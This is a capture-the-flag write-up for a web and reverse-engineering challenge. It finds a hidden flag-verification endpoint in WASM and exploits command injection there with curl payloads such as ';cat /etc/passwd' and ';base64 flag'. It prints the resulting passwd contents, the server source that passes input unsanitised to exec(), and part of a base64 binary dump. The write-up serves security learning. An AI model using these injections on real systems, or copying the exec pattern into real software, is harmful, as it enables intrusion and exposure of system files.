# Fortune

🔮 Category: _REV/WEB_
🔗 Url: http://fortune-ca29a1bd80cd.1753ctf.com

> This website use state of the art AI algorithm to find wisdom that fits your needs! Now it's gonna be easy!

## Discovery

There is a website that provides motivational quotes in various categories. It seems that the logic of grabbing the quote categories and quotes is hidden inside the WASM code that runs it. Is this the reason of "REV" category in this challenge?

The `fortune_api.wasm` file can be downloaded and turned from binary to text format with online tools like https://webassembly.github.io/wabt/demo/wasm2wat. 

Result of it is not pretty, but we can see the list of endpoints this WASM can call in that code 

```
/api/v1.05.1753/categories
/api/v1.05.1753/fortune?category=%s
/api/v1.03.410/verify-my-flag/%s
```

The third one on that list seems interesting, as it's not used in the application directly and looks like something that someone left here by mistake.

Trying to call that endpoint we can actually get a flag validated:

```bash
$ curl https://fortune-ca29a1bd80cd.1753ctf.com/api/v1.03.410/verify-my-flag/test
{"result":"Nope."}%        
```

Not knowing the flag we  can't do much, but after playing with that endpoint for a while we can notice it is vulnerable to command injection:

```bash
$ curl "https://fortune-ca29a1bd80cd.1753ctf.com/api/v1.03.410/verify-my-flag/test%3Bcat%20%2Fetc%2Fpasswd"
{"result":"Nope.\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/bash"}%
```

This is great, now we can see what files are in there:

```bash
$ curl "https://fortune-ca29a1bd80cd.1753ctf.com/api/v1.03.410/verify-my-flag/test%3Bls"
{"result":"Nope.\nflag\nindex.js\nnode_modules\npackage-lock.json\npackage.json\npublic"}%
```

Of course the `flag` file is what we want to read. Now it's gonna be easy.

```bash
curl "https://fortune-ca29a1bd80cd.1753ctf.com/api/v1.03.410/verify-my-flag/test%3Bcat%20flag"
```

But what? It seems to return some random data, not the flag. Is this a binary?

Let's print `index.js` file and see what is going on:

```bash
$ curl "https://fortune-ca29a1bd80cd.1753ctf.com/api/v1.03.410/verify-my-flag/test%3Bcat%20index.js"
{"result":"Nope.\nconst express = require('express');\nconst path = require('path');\nconst app = express();\nconst port = 1337;\n\n// Serve static files\napp.use(express.static('public'));\n\n// API endpoints\napp.get('/api/v1.05.1753/categories', (req, res) => {\n  const { exec } = require('child_process');\n  \n  exec('/usr/games/fortune -f', (error, stdout, stderr) => {\n    if (error || stderr === '') {\n      return res.status(500).send(\"Internal server error\");\n    }\n\n    const categories = stderr\n      .split('\\n')\n      .filter(line => line.includes('%') && !line.includes('/'))\n      .map(line => {\n        const match = line.trim().match(/%\\s*(.*)/);\n        if (match) {\n          // Capitalize first letter\n          const name = match[1].trim();\n          return name.charAt(0).toUpperCase() + name.slice(1);\n        }\n\n        return null;\n      })\n      .filter(Boolean);\n    \n    res.json(categories);\n  });\n});\n\n\napp.get('/api/v1.05.1753/fortune', (req, res) => {\n  const category = req.query.category?.toLowerCase();\n  if(!category) return res.status(400).send(\"Missing category parameter\");\n  \n  const { exec } = require('child_process');\n\n  if(category.match(/[^a-zA-Z0-9]/))\n    return res.status(400).send(\"Invalid category parameter\");\n\n  exec(`/usr/games/fortune ${category}`, (error, stdout, stderr) => {\n    if (error || stderr) {\n      return res.status(500).send(\"Internal server error\");\n    }\n    res.send(stdout.replaceAll('\\n', '<br>'));\n  });\n });\n\n app.get('/api/v1.03.410/verify-my-flag/:secret', (req, res) => {\n  const secret = req.params.secret;\n  const path = require('path');\n  const { exec } = require('child_process');\n  \n  const flagPath = path.join(__dirname, 'flag');\n  \n  exec(`${flagPath} ${secret}`, (error, stdout, stderr) => {\n    if (error || stderr) {\n      return res.status(500).send(\"Internal server error\");\n    }\n\n    try {\n      res.json({ result: stdout.trim() });\n    } catch (e) {\n      res.status(500).send(\"Internal server error\");\n    }\n  });\n });\n\n// Serve the main HTML file\napp.get('/', (req, res) => {\n  res.sendFile(path.join(__dirname, 'public', 'index.html'));\n});\n\napp.use((err, req, res, next) => {\n  res.status(500).send('What?');\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}`);\n});"}% 
```

Well, let's prettify that code:

```js
const express = require('express');
const path = require('path');
const app = express();
const port = 1337;

// Serve static files
app.use(express.static('public'));

// API endpoints
app.get('/api/v1.05.1753/categories', (req, res) => {
  const { exec } = require('child_process');
  
  exec('/usr/games/fortune -f', (error, stdout, stderr) => {
    if (error || stderr === '') {
      return res.status(500).send("Internal server error");
    }

    const categories = stderr
      .split('\
')
      .filter(line => line.includes('%') && !line.includes('/'))
      .map(line => {
        const match = line.trim().match(/%\\s*(.*)/);
        if (match) {
          // Capitalize first letter
          const name = match[1].trim();
          return name.charAt(0).toUpperCase() + name.slice(1);
        }

        return null;
      })
      .filter(Boolean);
    
    res.json(categories);
  });
});


app.get('/api/v1.05.1753/fortune', (req, res) => {
  const category = req.query.category?.toLowerCase();
  if(!category) return res.status(400).send("Missing category parameter");
  
  const { exec } = require('child_process');

  if(category.match(/[^a-zA-Z0-9]/))
    return res.status(400).send("Invalid category parameter");

  exec(`/usr/games/fortune ${category}`, (error, stdout, stderr) => {
    if (error || stderr) {
      return res.status(500).send("Internal server error");
    }
    res.send(stdout.replaceAll('\
', '<br>'));
  });
 });

 app.get('/api/v1.03.410/verify-my-flag/:secret', (req, res) => {
  const secret = req.params.secret;
  const path = require('path');
  const { exec } = require('child_process');
  
  const flagPath = path.join(__dirname, 'flag');
  
  exec(`${flagPath} ${secret}`, (error, stdout, stderr) => {
    if (error || stderr) {
      return res.status(500).send("Internal server error");
    }

    try {
      res.json({ result: stdout.trim() });
    } catch (e) {
      res.status(500).send("Internal server error");
    }
  });
 });

// Serve the main HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.use((err, req, res, next) => {
  res.status(500).send('What?');
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
```

Okay, so the `flag` file is indeed a binary, that checks the flag. Not a file containging the flag directly. Can we somehow grab this binary?

We can try to get it as a base64 to make sure it gets to us correctly:

```bash
$curl "https://fortune-ca29a1bd80cd.1753ctf.com/api/v1.03.410/verify-my-flag/test%3Bbase64%20flag"
{"result":"Nope.\nf0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAwBAAAAAAAABAAAAAAAAAABA4AAAAAAAAAAAAAEAAOAAN\nAEAAHwAeAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA\nAAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA\nAAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAHAAAAAAAAoAcAAAAAAAAAEAAA\nAAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAOQYAAAAAAAA5BgAAAAAAAAAQAAAA\nAAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAABYAQAAAAAAAFgBAAAAAAAAABAAAAAA\nAAABAAAABgAAANAtAAAAAAAA0D0AAAAAAADQPQAAAAAAAIACAAAAAAAAiAIAAAAAAAAAEAAAAAAA\nAAIAAAAGAAAA4C0AAAAAAADgPQAAAAAAAOA9AAAAAAAA4AEAAAAAAADgAQAAAAAAAAgAAAAAAAAA\nBAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE\nAAAABAAAAFgDAAAAAAAAWAMAAAAAAABYAwAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAAAFPl\ndGQEAAAAOAMAAAAAAAA4AwAAAAAAADgDAAAAAAAAIAAAAAAAAAAgAAAAAAAAAAgAAAAAAAAAUOV0\nZAQAAABUIAAAAAAAAFQgAAAAAAAAVCAAAAAAAAA0AAAAAAAAADQAAAAAAAAABAAAAAAAAABR5XRk\nBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQE\nAAAA0C0AAAAAAADQPQAAAAAAANA9AAAAAAAAMAIAAAAAAAAwAgAAAAAAAAEAAAAAAAAAL2xpYjY0\nL2xkLWxpbnV4LXg4Ni02NC5zby4yAAAAAAAEAAAAEAAAAAUAAABHTlUAAoAAwAQAAAABAAAAAAAA\nAAQAAAAUAAAAAwAAAEdOVQByBuY2ynHwB9FxOokUH4x8kDgEOgQAAAAQAAAAAQAAAEdOVQAAAAAA\nAwAAAAIAAAAAAAAAAAAAAAIAAAANAAAAAQAAAAYAAAAAAIEAAAAAAA0AAAAAAAAA0WXObQAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAB3AAAAIAAAAAAA\nAAAAAAAAAAAAAAAAAAABAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAEgAAAAAAAAAAAAAAAAAA\nAAAAAAAzAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABBAAAAEgAAAAAAAAAAAAAAAAAAAAAAAABIAAAA\nEgAAAAAAAAAAAAAAAAAAAAAAAACTAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAEgAAAAAAAAAA\nAAAAAAAAAAAAAABPAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAANAAAAEgAAAAAAAAAAAAAAAAAAAAAA\nAACiAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAcHV0cwBz\ndHJsZW4AYXRvaQBfX2xpYmNfc3RhcnRfbWFpbgBfX2N4YV9maW5hbGl6ZQBzdHJjaHIAcmFuZG9t\nAHByaW50ZgBzdHJjbXAAc3Ryc2VwAGxpYmMuc28uNgBHTElCQ18yLjIuNQBHTElCQ18yLjM0AF9J\nVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2dtb25fc3RhcnRfXwBfSVRNX3JlZ2lzdGVyVE1D\nbG9uZVRhYmxlAAAAAgABAAMAAwADAAMAAwABAAMAAwADAAEAAwABAAIAVgAAABAAAAAAAAAAdRpp\nCQAAAwBgAAAAEAAAALSRlgYAAAIAbAAAAAAAAADQPQAAAAAAAAgAAAAAAAAAoBEAAAAAAADYPQAA\nAAAAAAgAAAAAAAAAYBEAAAAAAABIQAAAAAAAAAgAAAAAAAAASEAAAAAAAADAPwAAAAAAAAYAAAAB\nAAAAAAAAAAAAAADIPwAAAAAAAAYAAAACAAAAAAAAAAAAAADQPwAAAAAAAAYAAAAIAAAAAAAAAAAA\nAADYPwAAAAAAAAYAAAAMAAAAAAAAAAAAAADgPwAAAAAAAAYAAAANAAAAAAAAAAAAAAAAQAAAAAAA\nAAcAAAADAAAAAAAAAAAAAAAIQAAAAAAAAAcAAAAEAAAAAAAAAAAAAAAQQAAAAAAAAAcAAAAFAAAA\nAAAAAAAAAAAYQAAAAAAAAAcAAAAGAAAAAAAAAAAAAAAgQAAAAAAAAAcAAAAHAAAAAAAAAAAAAAAo\nQAAAAAAAAAcAAAAJAAAAAAAAAAAAAAAwQAAAAAAAAAcAAAAKAAAAAAAAAAAAAAA4QAAAAAAAAAcA\nAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXF\nLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////\nJcIvAABoAQAAAOnQ/////yW6LwAAaAIAAADpwP////8lsi8AAGgDAAAA6bD/////JaovAABoBAAA\nAOmg/////yWiLwAAaAUAAADpkP////8lmi8AAGgGAAAA6YD/////JZIvAABoBwAAAOlw/////yUq\nLwAAZpAAAAAAAAAAADHtSYnRXkiJ4kiD5PBQVEUxwDHJSI09zAQAAP8V3y4AAPRmLg8fhAAAAAAA\nDx9AAEiNPVkvAABIjQVSLwAASDn4dBVIiwW+LgAASIXAdAn/4A8fgAAAAADDDx+AAAAAAEiNPSkv\nAABIjTUiLwAASCn+SInwSMHuP0jB+ANIAcZI0f50FEiLBY0uAABIhcB0CP/gZg8fRAAAww8fgAAA\nAADzDx76gD3lLgAAAHUrVUiDPWouAAAASInldAxIiz3GLgAA6Cn////oZP///8YFvS4AAAFdww8f\nAMMPH4AAAAAA8w8e+ul3////VUiJ5VNIgezIAAAASIm9SP///0iJtUD///9IiZU4////SIuFSP//\n/0iJx+hn/v//SIP4HnQKuAAAAADpuAMAAEiLhUj///++ewAAAEiJx+hT/v//SIXAdBlIi4VI////\nvn0AAABIicfoOv7//0iFwHUKuAAAAADpfAMAAEiNhUj///9IjRXRDQAASInWSInH6FL+//9IiUW4\nSI2FSP///0iNFbYNAABIidZIicfoNf7//0iJRcjHRewAAAAAx0XoAAAAAOsXSItVuItF6EgB0A+2\nAA++wAFF7INF6AGLXehIi0W4SInH6Kv9//9IOcNy1YtF7GnAPAcAAIlF7MdF5AAAAADHReAAAAAA\n6x2LReBIY9BIi4U4////SAHQD7YAD77AAUXkg0XgAYtF4Ehj2EiLhTj///9IicfoWP3//0g5w3LJ\nSI1FuEiNFRANAABIidZIicfojf3//0iJx+iV/f//Lc8EAACJhWD////HhVj///8CAAAAi4VY////\ng8ABSJjHhIVQ////UgAAAIuVWP///4nQweAEAdCJhWT///9Ii4VI////SInH6Oj8//+DwCmJRZyL\nhVj///9rwDKJRYyLRYyD6AqJhXj////HhVT////aAQAASIuFSP///0iJx+ix/P//AcCDwDGJhWj/\n///HhXD///9KAAAASIuFQP///0iJx+iN/P//iYV0////i4VU////SGPQSGnSq6qqKkiJ0UjB6SCZ\nicgp0ImFbP///4uVaP///4uFbP///wHQg8ABiUWoi0WMg8AFiYV8////x0WAUgAAAMdFiOwAAACL\nRYiJRYSLRYiDwAGJRYiLlVT///+LRZwpwolVkIuFdP///8HgAolFlItFiIPADEiYicNIi4VI////\nSInH6PX7//8Pr8MFXgEAAIlFmItFiIPAAYlFiItF5IPADolFoItFnIPAAYlFnItViInQweACAdAB\nwInBi0XsugAAAAD38YnBi4Vw////SGPQSGnSZ2ZmZkjB6iDB+gLB+B8pwonQAciJRaSLRZhImInD\nSIuFSP///0iJx+h8+///D6/DiUWYi0WIg8ABiUWIi0Wcg8ABiUWci5V0////i4VY////idMPr9hI\ni0W4SI0VEgsAAEiJ1kiJx+ht+///KcOJ2ouFWP///wHQiUWox0WsHQAAAItFmAVeAQAAiUWYx0Xc\nAQAAAOtpi0XcSJiLhIVQ////iUXEx0XUAAAAAOsm6Db7//9IicJIidBIwfg/SMHoOUgBwoPif0gp\nwkiJ0IhF24NF1AGLRdQ7RcR80otF3EiYSI1Q/0iLRchIAdAPtgA4Rdt0B7gAAAAA6w+DRdwBg33c\nF36RuAEAAABIi134ycNVSInlSIPsEIl9/EiJdfCDffwBfyVIi0XwSIsASInGSI0FSgoAAEiJx7gA\nAAAA6Ib6//+4AQAAAOtNSItF8EiDwAhIiwBIjRU4CgAASI0NNgoAAEiJzkiJx+ik+///hcB+EUiN\nBScKAABIicfoGPr//+sPSI0FKwoAAEiJx+gH+v//uAAAAADJw0iD7AhIg8QIwwAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAewB9AGMAbjB0X3Ro\nMXpfdzR5AFVzYWdlOiAlcyA8c2VjcmV0PgoAeGR4ZABkZW5pZWQAWWVzLCB0aGF0J3MgdGhlIGZs\nYWcATm9wZS4AAAABGwM7MAAAAAUAAADM7///fAAAAFzw//+kAAAAbPD//0wAAABV8f//vAAAAFP1\n///gAAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQcQFAAAABwAAAAY8P//IgAAAAAAAAAAAAAAFAAA\nAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAABI7///kAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQi\nAAAAABQAAABEAAAAsO///wgAAAAAAAAAAAAAACAAAABcAAAAkfD///4DAAAAQQ4QhgJDDQZIgwMD\n8QMMBwgAABwAAACAAAAAa/T//4kAAAAAQQ4QhgJDDQYChAwHCAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA